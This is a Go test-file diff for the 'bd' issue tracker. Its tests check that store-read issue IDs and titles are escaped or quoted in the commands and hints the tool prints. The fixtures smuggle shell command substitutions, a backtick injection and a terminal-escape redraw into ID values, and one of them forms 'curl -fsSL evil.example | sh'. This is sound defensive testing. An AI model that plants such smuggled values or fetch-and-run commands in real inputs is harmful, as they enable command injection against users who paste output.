@@ -4,6 +4,7 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"go/ast"
@@ -581,6 +582,378 @@ func TestPasteReadyCommandsQuoteValues(t *testing.T) {
 	}
 }
 
+// TestStoreReadIDHintsQuoteIDs pins the hints that paste an issue ID read
+// from the store, which holds a collaborator's issues after bd dolt pull,
+// into the bd command they suggest, with the lines printed around the
+// command, which a user can paste with it: bd duplicates (a group's issues,
+// its Note and Suggested lines, and --json's suggested_action and
+// merge_commands), bd mol current (a molecule's steps, the next step's claim
+// and a step's bd show, and a large molecule's bd mol current and bd mol
+// progress), bd mol stale's bd close and the issues a molecule blocks, and
+// bd close --continue's claim and bd mol squash, with the molecule bd close
+// auto-closed and, with --suggest-next, the issues it unblocked above them.
+// Each row is the whole output of the printers it calls;
+// TestEmbeddedRemedyPrinting_closeContinue and TestProxiedServerClose2B pin
+// bd close --continue's whole output, with the line naming the closed step.
+// A command spells the ID {id} and the note naming it {note}: an
+// ordinary ID prints as it did, an ID holding shell syntax goes into the
+// command single-quoted on POSIX, and one no quoting passes on (on Windows,
+// any with a $ or a backtick) takes the row's placeholder, named escaped
+// after the command (remedy.CommandArg). No command is printed between
+// backticks, which a backtick in the quoted ID would end. The lines around
+// the command name the ID {shown}: as it is when it is a plain word, and
+// otherwise escaped (remedy.EscapedValue), so pasting them with the command
+// runs no part of it, a line feed in it cannot end merge_commands' comment
+// line, and it cannot redraw the command.
+func TestStoreReadIDHintsQuoteIDs(t *testing.T) {
+	// bd close names an issue with its title, as output.title-length's
+	// default lets it.
+	initConfigForTest(t)
+	// duplicates is a duplicate group of target, the issue with dependents
+	// and so the merge target, and sources, in that order.
+	duplicates := func(target string, sources ...string) ([][]*types.Issue, map[string]*issueScore) {
+		group := []*types.Issue{{ID: target, Title: "Same", Status: types.StatusOpen}}
+		for _, id := range sources {
+			group = append(group, &types.Issue{ID: id, Title: "Same", Status: types.StatusOpen})
+		}
+		return [][]*types.Issue{group}, map[string]*issueScore{target: {dependentCount: 1}}
+	}
+	duplicatesText := func(t *testing.T, groups [][]*types.Issue, scores map[string]*issueScore) string {
+		return captureStdout(t, func() error {
+			return outputDuplicates(groups, map[string]int{}, scores, false, false, nil)
+		})
+	}
+	// mergeCommand is the one merge_commands element bd duplicates
+	// --dry-run --json prints for groups.
+	mergeCommand := func(t *testing.T, groups [][]*types.Issue, scores map[string]*issueScore) string {
+		previous := jsonOutput
+		jsonOutput = true
+		t.Cleanup(func() { jsonOutput = previous })
+		out := captureStdout(t, func() error {
+			return outputDuplicates(groups, map[string]int{}, scores, false, true, nil)
+		})
+		var got struct {
+			MergeCommands []string `json:"merge_commands"`
+		}
+		if err := json.Unmarshal([]byte(out), &got); err != nil || len(got.MergeCommands) != 1 {
+			t.Fatalf("bd duplicates --dry-run --json printed %q: %v", out, err)
+		}
+		return got.MergeCommands[0]
+	}
+	// group is bd duplicates' output for one group, whose issue, Note and
+	// Suggested lines are lines.
+	group := func(lines string) string {
+		return "🔍 Found 1 duplicate group(s):\n\n━━ Group 1: Same\n" + lines + "\n💡 Run with --auto-merge to execute all suggested merges\n"
+	}
+	printed := func(t *testing.T, fn func()) string {
+		return captureStdout(t, func() error {
+			fn()
+			return nil
+		})
+	}
+	// largeNote is the line a large molecule's summary prints above its
+	// bd mol current and bd mol progress commands.
+	largeNote := "Note: This molecule has 150 steps (threshold: " + strconv.Itoa(LargeMoleculeThreshold) + ").\nTo view steps, use one of:\n"
+	for _, tc := range []struct {
+		name, placeholder, want string
+		hint                    func(t *testing.T, id string) string
+	}{
+		{"bd duplicates", "<duplicate-id>", group(
+			"→ bd-1 (open, P0, weight=3, 0 refs)\n" +
+				"  {shown} (open, P0, weight=0, 0 refs)\n" +
+				"  Note: Duplicate: {shown} (same content as bd-1)\n" +
+				"  Suggested: bd close {id} && bd dep add {id} bd-1 --type related{note}\n"),
+			func(t *testing.T, id string) string {
+				groups, scores := duplicates("bd-1", id)
+				return duplicatesText(t, groups, scores)
+			}},
+		{"bd duplicates, several duplicates", "<duplicate-id-1>", group(
+			"→ bd-1 (open, P0, weight=3, 0 refs)\n" +
+				"  {shown} (open, P0, weight=0, 0 refs)\n" +
+				"  bd-3 (open, P0, weight=0, 0 refs)\n" +
+				"  Note: Duplicate: {shown} bd-3 (same content as bd-1)\n" +
+				"  Suggested: bd close {id} bd-3 && bd dep add {id} bd-3 bd-1 --type related{note}\n"),
+			func(t *testing.T, id string) string {
+				groups, scores := duplicates("bd-1", id, "bd-3")
+				return duplicatesText(t, groups, scores)
+			}},
+		{"bd duplicates, merge target", "<target-id>", group(
+			"→ {shown} (open, P0, weight=3, 0 refs)\n" +
+				"  bd-3 (open, P0, weight=0, 0 refs)\n" +
+				"  Note: Duplicate: bd-3 (same content as {shown})\n" +
+				"  Suggested: bd close bd-3 && bd dep add bd-3 {id} --type related{note}\n"),
+			func(t *testing.T, id string) string {
+				groups, scores := duplicates(id, "bd-3")
+				return duplicatesText(t, groups, scores)
+			}},
+		{"bd duplicates --json suggested_action", "<duplicate-id>", "bd close {id} && bd dep add {id} bd-1 --type related{note}",
+			func(t *testing.T, id string) string {
+				groups, scores := duplicates("bd-1", id)
+				return formatDuplicateGroupsJSON(groups, map[string]int{}, scores)[0]["suggested_action"].(string)
+			}},
+		{"bd duplicates --dry-run --json merge_commands", "<duplicate-id>",
+			"# Duplicate: {shown} (same content as bd-1)\n" +
+				"# Suggested action: bd close {id} && bd dep add {id} bd-1 --type related{note}",
+			func(t *testing.T, id string) string {
+				groups, scores := duplicates("bd-1", id)
+				return mergeCommand(t, groups, scores)
+			}},
+		{"bd duplicates --dry-run --json merge_commands, merge target", "<target-id>",
+			"# Duplicate: bd-3 (same content as {shown})\n" +
+				"# Suggested action: bd close bd-3 && bd dep add bd-3 {id} --type related{note}",
+			func(t *testing.T, id string) string {
+				groups, scores := duplicates(id, "bd-3")
+				return mergeCommand(t, groups, scores)
+			}},
+		{"bd mol current, next step", "<step-id>",
+			"You're working on molecule bd-1\n  Mol\n\n" +
+				"  [ready] {shown}: Step\n\n" +
+				"Progress: 0/1 steps complete\n\n" +
+				"Next ready: {shown} - Step\n" +
+				"  Start with: bd update {id} --claim{note}\n\n" +
+				"💡 Run bd show {id}{note} to see detailed instructions.\n",
+			func(t *testing.T, id string) string {
+				step := &types.Issue{ID: id, Title: "Step"}
+				return printed(t, func() {
+					printMoleculeProgress(&MoleculeProgress{MoleculeID: "bd-1", MoleculeTitle: "Mol",
+						Steps: []*StepStatus{{Issue: step, Status: "ready"}}, NextStep: step, Total: 1})
+				})
+			}},
+		{"bd mol current, current step", "<step-id>",
+			"You're working on molecule bd-1\n  Mol\n\n" +
+				"  [current] {shown}: Step <- YOU ARE HERE\n\n" +
+				"Progress: 0/1 steps complete\n\n" +
+				"💡 Run bd show {id}{note} to see detailed instructions.\n",
+			func(t *testing.T, id string) string {
+				step := &types.Issue{ID: id, Title: "Step"}
+				return printed(t, func() {
+					printMoleculeProgress(&MoleculeProgress{MoleculeID: "bd-1", MoleculeTitle: "Mol",
+						Steps: []*StepStatus{{Issue: step, Status: "current", IsCurrent: true}}, CurrentStep: step, Total: 1})
+				})
+			}},
+		{"bd mol current, molecule", "",
+			"You're working on molecule {shown}\n  Mol\n\n" +
+				"  [ready] bd-1.1: Step\n\n" +
+				"Progress: 0/1 steps complete\n\n" +
+				"Next ready: bd-1.1 - Step\n" +
+				"  Start with: bd update bd-1.1 --claim\n\n" +
+				"💡 Run bd show bd-1.1 to see detailed instructions.\n",
+			func(t *testing.T, id string) string {
+				step := &types.Issue{ID: "bd-1.1", Title: "Step"}
+				return printed(t, func() {
+					printMoleculeProgress(&MoleculeProgress{MoleculeID: id, MoleculeTitle: "Mol",
+						Steps: []*StepStatus{{Issue: step, Status: "ready"}}, NextStep: step, Total: 1})
+				})
+			}},
+		{"bd mol current, large molecule", "<molecule-id>",
+			"Molecule: {shown}\n  Mol\n\n" +
+				"Progress: 0 / 150 steps (0.0%)\n\n" + largeNote +
+				"  bd mol current {id} --limit 50        # First 50 steps\n" +
+				"  bd mol current {id} --range 1-50     # Steps 1-50\n" +
+				"  bd mol progress {id}                 # Efficient progress summary{noteline}\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					printLargeMoleculeSummary(&types.MoleculeProgressStats{MoleculeID: id, MoleculeTitle: "Mol", Total: 150})
+				})
+			}},
+		{"bd mol current, large molecule's current step", "<step-id>",
+			"Molecule: bd-1\n  Mol\n\n" +
+				"Progress: 0 / 150 steps (0.0%)\n" +
+				"Current step: {shown}\n\n" + largeNote +
+				"  bd mol current bd-1 --limit 50        # First 50 steps\n" +
+				"  bd mol current bd-1 --range 1-50     # Steps 1-50\n" +
+				"  bd mol progress bd-1                 # Efficient progress summary\n\n" +
+				"💡 Run bd show {id}{note} to see detailed instructions.\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					printLargeMoleculeSummary(&types.MoleculeProgressStats{MoleculeID: "bd-1", MoleculeTitle: "Mol", Total: 150, CurrentStepID: id})
+				})
+			}},
+		{"bd mol stale", "<molecule-id>",
+			"ℹ Molecules with all children closed (review scope before closing):\n\n" +
+				"  {shown}  Mol  (1/1)\n" +
+				"       → Close with: bd close {id}{note}\n\n" +
+				"Total: 1 stale\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: id, Title: "Mol", TotalChildren: 1, ClosedChildren: 1}}, TotalCount: 1}, false)
+				})
+			}},
+		{"bd mol stale --blocking", "<molecule-id>",
+			"⚠ Molecules with all children closed (review scope; blocking work):\n\n" +
+				"  {shown}  Mol  (1/1) [blocking 1]\n" +
+				"       → Close with: bd close {id}{note}\n" +
+				"       → Blocking: [bd-1]\n\n" +
+				"Total: 1 stale, 1 blocking other work\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: id, Title: "Mol", TotalChildren: 1, ClosedChildren: 1,
+						BlockingIssues: []string{"bd-1"}, BlockingCount: 1}}, TotalCount: 1, BlockingCount: 1}, true)
+				})
+			}},
+		{"bd mol stale --blocking, blocked issue", "",
+			"⚠ Molecules with all children closed (review scope; blocking work):\n\n" +
+				"  bd-1  Mol  (1/1) [blocking 2]\n" +
+				"       → Close with: bd close bd-1\n" +
+				"       → Blocking: [{shown} bd-3]\n\n" +
+				"Total: 1 stale, 1 blocking other work\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: "bd-1", Title: "Mol", TotalChildren: 1, ClosedChildren: 1,
+						BlockingIssues: []string{id, "bd-3"}, BlockingCount: 2}}, TotalCount: 1, BlockingCount: 1}, true)
+				})
+			}},
+		{"bd close --continue, next step", "<step-id>",
+			"\nNext ready in molecule:\n" +
+				"  {shown}: Step\n\n" +
+				"Start with: bd update {id} --claim{note}\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, NextStep: &types.Issue{ID: id, Title: "Step"}})
+				})
+			}},
+		{"bd close --continue --suggest-next, next step", "<step-id>",
+			"\nNewly unblocked:\n" +
+				"  • {shown} — Step (P1)\n" +
+				"\nNext ready in molecule:\n" +
+				"  {shown}: Step\n\n" +
+				"Start with: bd update {id} --claim{note}\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					printNewlyUnblocked([]*types.Issue{{ID: id, Title: "Step", Priority: 1}})
+					PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, NextStep: &types.Issue{ID: id, Title: "Step"}})
+				})
+			}},
+		{"bd close --continue, molecule complete", "<molecule-id>",
+			"✓ Auto-closed completed molecule {shown} — Mol\n" +
+				"\n✓ Molecule {shown} complete! All steps closed.\n" +
+				"Consider: bd mol squash {id} --summary '...'{note}\n",
+			func(t *testing.T, id string) string {
+				return printed(t, func() {
+					reportMoleculeAutoClose(&types.Issue{ID: id, Title: "Mol"}, "")
+					PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, MolComplete: true, MoleculeID: id})
+				})
+			}},
+	} {
+		// Each ID is named shown on the lines around a command: escaped,
+		// unless it is a plain word, with its $ spelled \x24, its backtick
+		// \x60, its ; \x3b and its line feed \n. An ID that holds shell
+		// syntax but prints as itself goes into a command single-quoted on
+		// POSIX (quoted). The backtick ID is the one that ran its ;-separated
+		// command when bd mol current put bd show between backticks.
+		for _, id := range []struct {
+			value, shown string
+			quoted       bool
+		}{
+			{"bd-2.1", "bd-2.1", false},
+			{"bd-x$(touch${IFS}pwned)", `"bd-x\x24(touch\x24{IFS}pwned)"`, true},
+			{"bd-x`;touch pwned;`", `"bd-x\x60\x3btouch pwned\x3b\x60"`, true},
+			{"bd-x\necho pwned #", `"bd-x\necho pwned #"`, false},
+			{hostileName, remedy.EscapedValue(hostileName), false},
+		} {
+			t.Run(tc.name+"/"+strconv.Quote(id.value), func(t *testing.T) {
+				// On Windows no quoting passes a $ or a backtick on
+				// unchanged, so the command takes the placeholder there too.
+				spelled, note := id.value, ""
+				switch {
+				case id.quoted && runtime.GOOS != "windows":
+					spelled = "'" + id.value + "'"
+				case id.value != "bd-2.1":
+					spelled, note = tc.placeholder, "  ("+tc.placeholder+": "+id.shown+")"
+				}
+				noteLine := ""
+				if note != "" {
+					noteLine = "\n" + note
+				}
+				want := strings.NewReplacer("{id}", spelled, "{noteline}", noteLine, "{note}", note, "{shown}", id.shown).Replace(tc.want)
+				got := tc.hint(t, id.value)
+				if got != want {
+					t.Errorf("%s prints\n%q\nwant\n%q", tc.name, got, want)
+				}
+				requireNoTerminalControl(t, tc.name, got)
+				// sh, bash and zsh run a pasted `...` as a command
+				// substitution, which a backtick in the quoted ID would end,
+				// so the only backticks printed are the ID's own.
+				if strings.Contains(strings.ReplaceAll(got, spelled, ""), "`") {
+					t.Errorf("%s prints a backtick outside the quoted ID:\n%q", tc.name, got)
+				}
+			})
+		}
+	}
+}
+
+// TestStoreReadHintsNameTitlesEscaped pins the other values the printers of
+// TestStoreReadIDHintsQuoteIDs read from the store: a title, an assignee and
+// a status are each spelled by remedy.PrintedValue, so a carriage return or
+// terminal escape in one cannot redraw a hint printed above or below it, and
+// the value is still named. So is the refusal bd close prints when a
+// completed molecule's root refuses its auto-close, whose sentence names the
+// root.
+func TestStoreReadHintsNameTitlesEscaped(t *testing.T) {
+	// bd close names an issue with its title, as output.title-length's
+	// default lets it.
+	initConfigForTest(t)
+	for _, tc := range []struct {
+		name string
+		run  func()
+	}{
+		{"bd duplicates", func() {
+			group := []*types.Issue{{ID: "bd-1", Title: hostileName, Status: types.Status(hostileName)}, {ID: "bd-2", Title: hostileName, Status: types.StatusOpen}}
+			_ = outputDuplicates([][]*types.Issue{group}, map[string]int{}, map[string]*issueScore{"bd-1": {dependentCount: 1}}, false, false, nil)
+		}},
+		{"bd mol current", func() {
+			step := &types.Issue{ID: "bd-1.1", Title: hostileName}
+			printMoleculeProgress(&MoleculeProgress{MoleculeID: "bd-1", MoleculeTitle: hostileName, Assignee: hostileName,
+				Steps: []*StepStatus{{Issue: step, Status: "ready"}}, NextStep: step, Total: 1})
+		}},
+		{"bd mol current, large molecule", func() {
+			printLargeMoleculeSummary(&types.MoleculeProgressStats{MoleculeID: "bd-1", MoleculeTitle: hostileName, Total: 150, CurrentStepID: "bd-1.1"})
+		}},
+		{"bd mol stale", func() {
+			renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: "bd-1", Title: hostileName, TotalChildren: 1, ClosedChildren: 1}}, TotalCount: 1}, false)
+		}},
+		{"bd mol stale --blocking", func() {
+			renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: "bd-1", Title: hostileName, TotalChildren: 1, ClosedChildren: 1,
+				BlockingIssues: []string{"bd-2"}, BlockingCount: 1}}, TotalCount: 1, BlockingCount: 1}, true)
+		}},
+		{"bd close --continue", func() {
+			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, NextStep: &types.Issue{ID: "bd-1.2", Title: hostileName}})
+		}},
+		{"bd close --continue --suggest-next", func() {
+			printNewlyUnblocked([]*types.Issue{{ID: "bd-1.2", Title: hostileName, Priority: 1}})
+			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1.1"}, NextStep: &types.Issue{ID: "bd-1.2", Title: "Step"}})
+		}},
+		{"bd close --continue, molecule complete", func() {
+			reportMoleculeAutoClose(&types.Issue{ID: "bd-1", Title: hostileName}, "")
+			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1.1"}, MolComplete: true, MoleculeID: "bd-1"})
+		}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			out := captureStdout(t, func() error {
+				tc.run()
+				return nil
+			})
+			requireNoTerminalControl(t, tc.name, out)
+			requireNamesHostileValue(t, tc.name, out)
+		})
+	}
+	// The refusal is printed on stderr, in the Auto-closed line's place, and
+	// an ordinary one prints as it is.
+	t.Run("bd close --continue, refused auto-close", func(t *testing.T) {
+		warning := func(root string) string {
+			refusal := (&issueops.CloseNotAssigneeError{IssueID: root, Assignee: "alice", Actor: "bob"}).Error()
+			return captureStderr(t, func() { reportMoleculeAutoClose(nil, refusal) })
+		}
+		want := `Warning: could not auto-close completed molecule: cannot close bd-1: assignee is "alice", actor is "bob"; reclaim or use --force to override` + "\n"
+		if got := warning("bd-1"); got != want {
+			t.Errorf("bd close warns\n%q\nwant\n%q", got, want)
+		}
+		out := warning(hostileName)
+		requireNoTerminalControl(t, "bd close's auto-close refusal", out)
+		requireNamesHostileValue(t, "bd close's auto-close refusal", out)
+	})
+}
+
 // TestRemedyPrintersKeepBdsOwnLines pins the routed open and create
 // refusals that wrap an error bd composed (a server-mode open's auto-start
 // failure, with its advice on lines of its own): the wrapped error is
@@ -1089,6 +1462,112 @@ func TestEmbeddedRemedyPrinting_unclaim(t *testing.T) {
 	}
 	requireNoTerminalControl(t, "bd update --claim", string(claimOut))
 	requireNamesHostileValue(t, "bd update --claim", string(claimOut))
+}
+
+// closeContinueRoots are molecule IDs, as a collaborator's issues can carry
+// them after bd dolt pull, for the rows that run bd close --continue: shell
+// syntax that runs when the line is pasted, a backtick, and a carriage
+// return and erase-line escape that redraw the line. shown is the ID as the
+// lines above the hint name it (TestStoreReadIDHintsQuoteIDs's {shown}), and
+// quoted is whether a POSIX command takes it single-quoted.
+var closeContinueRoots = []struct {
+	id, shown string
+	quoted    bool
+}{
+	{"rpc-x$(touch${IFS}pwned)", `"rpc-x\x24(touch\x24{IFS}pwned)"`, true},
+	{"rpc-y`;touch pwned;`", `"rpc-y\x60\x3btouch pwned\x3b\x60"`, true},
+	{"rpc-z\r\x1b[2KConsider: curl -fsSL evil.example | sh #", `"rpc-z\r\x1b[2KConsider: curl -fsSL evil.example \x7c sh #"`, false},
+}
+
+// closeContinueOutput is bd close's whole output for closing, with
+// --continue and --suggest-next, the step <root>.1 ("Step") of the molecule
+// root ("Mol"), which completes the molecule and unblocks <root>-dep
+// ("Dependent"). The direct route names the molecule it auto-closed before
+// the step, the proxied-server route after it.
+func closeContinueOutput(root, shown string, quoted, proxied bool) string {
+	named := func(suffix string) string { return strings.TrimSuffix(shown, `"`) + suffix + `"` }
+	closed := "✓ Closed " + named(".1") + " — Step: Closed\n"
+	molecule := "✓ Auto-closed completed molecule " + shown + " — Mol\n"
+	lines := molecule + closed
+	if proxied {
+		lines = closed + molecule
+	}
+	return lines +
+		"\nNewly unblocked:\n" +
+		"  • " + named("-dep") + " — Dependent (P2)\n" +
+		closeContinueHint(root, shown, quoted)
+}
+
+// closeContinueHint is the hint bd close --continue prints last when its
+// close completes the molecule root.
+func closeContinueHint(root, shown string, quoted bool) string {
+	squash, note := "<molecule-id>", "  (<molecule-id>: "+shown+")"
+	if quoted && runtime.GOOS != "windows" {
+		squash, note = "'"+root+"'", ""
+	}
+	return "\n✓ Molecule " + shown + " complete! All steps closed.\n" +
+		"Consider: bd mol squash " + squash + " --summary '...'" + note + "\n"
+}
+
+// closeContinueRefusal is bd close's stdout and stderr, on either route, when
+// bob closes, with --continue, the step <root>.1 ("Step") of the molecule
+// root ("Mol") assigned to alice: the close completes the molecule but the
+// root refuses its auto-close, so stdout names the step and the hint, and
+// stderr warns in the Auto-closed line's place with the refusal's sentence,
+// which names the root, spelled by remedy.PrintedValue.
+func closeContinueRefusal(root, shown string, quoted bool) (stdout, stderr string) {
+	refusal := (&issueops.CloseNotAssigneeError{IssueID: root, Assignee: "alice", Actor: "bob"}).Error()
+	return "✓ Closed " + strings.TrimSuffix(shown, `"`) + `.1"` + " — Step: Closed\n" + closeContinueHint(root, shown, quoted),
+		"Warning: could not auto-close completed molecule: " + remedy.PrintedValue(refusal) + "\n"
+}
+
+// TestEmbeddedRemedyPrinting_closeContinue pins bd close --continue's whole
+// output end to end on the direct route, for molecules whose IDs hold shell
+// syntax or a terminal escape: the lines above the bd mol squash hint (the
+// molecule the close auto-closed, the step it closed and, with
+// --suggest-next, the issue it unblocked) name each ID escaped, so pasting
+// the output runs no part of one and none can redraw the hint. When the
+// root refuses its auto-close, the warning bd close prints on stderr above
+// the hint cannot redraw it either (closeContinueRefusal).
+// TestProxiedServerClose2B's continue_names_ids_escaped and
+// continue_refused_auto_close_warns_escaped are its proxied twins.
+func TestEmbeddedRemedyPrinting_closeContinue(t *testing.T) {
+	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
+		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
+	}
+	t.Parallel()
+	bd := buildEmbeddedBD(t)
+	dir, _, _ := bdInit(t, bd, "--prefix", "rpc")
+	for _, root := range closeContinueRoots {
+		t.Run(strconv.Quote(root.id), func(t *testing.T) {
+			bdCreate(t, bd, dir, "Mol", "--type", "epic", "--labels", "template", "--id", root.id)
+			step := bdCreate(t, bd, dir, "Step", "--type", "task", "--parent", root.id)
+			bdCreate(t, bd, dir, "Dependent", "--type", "task", "--id", root.id+"-dep", "--deps", "depends-on:"+step.ID)
+			got := bdClose(t, bd, dir, step.ID, "--continue", "--suggest-next")
+			if want := closeContinueOutput(root.id, root.shown, root.quoted, false); got != want {
+				t.Errorf("bd close --continue --suggest-next prints\n%q\nwant\n%q", got, want)
+			}
+			requireNoTerminalControl(t, "bd close --continue", got)
+		})
+	}
+	// The same molecules in a workspace of their own, each root assigned to
+	// alice, so bob's close of the last step leaves the root open.
+	refusing, _, _ := bdInit(t, bd, "--prefix", "rpc")
+	for _, root := range closeContinueRoots {
+		t.Run(strconv.Quote(root.id)+", refused auto-close", func(t *testing.T) {
+			bdCreate(t, bd, refusing, "Mol", "--type", "epic", "--labels", "template", "--id", root.id, "--assignee", "alice")
+			step := bdCreate(t, bd, refusing, "Step", "--type", "task", "--parent", root.id)
+			stdout, stderr, exit := bdRunStreams(t, bd, refusing, "close", step.ID, "--continue", "--actor", "bob")
+			if exit != 0 {
+				t.Fatalf("bd close %s --continue exited %d\nstdout:\n%s\nstderr:\n%s", step.ID, exit, stdout, stderr)
+			}
+			wantStdout, wantStderr := closeContinueRefusal(root.id, root.shown, root.quoted)
+			if stdout != wantStdout || stderr != wantStderr {
+				t.Errorf("bd close --continue with a refused auto-close prints\n%q\non stdout and\n%q\non stderr, want\n%q\nand\n%q", stdout, stderr, wantStdout, wantStderr)
+			}
+			requireNoTerminalControl(t, "bd close --continue with a refused auto-close", stderr+stdout)
+		})
+	}
 }
 
 // TestEmbeddedRemedyPrinting_init pins the invariant at bd init end to end,
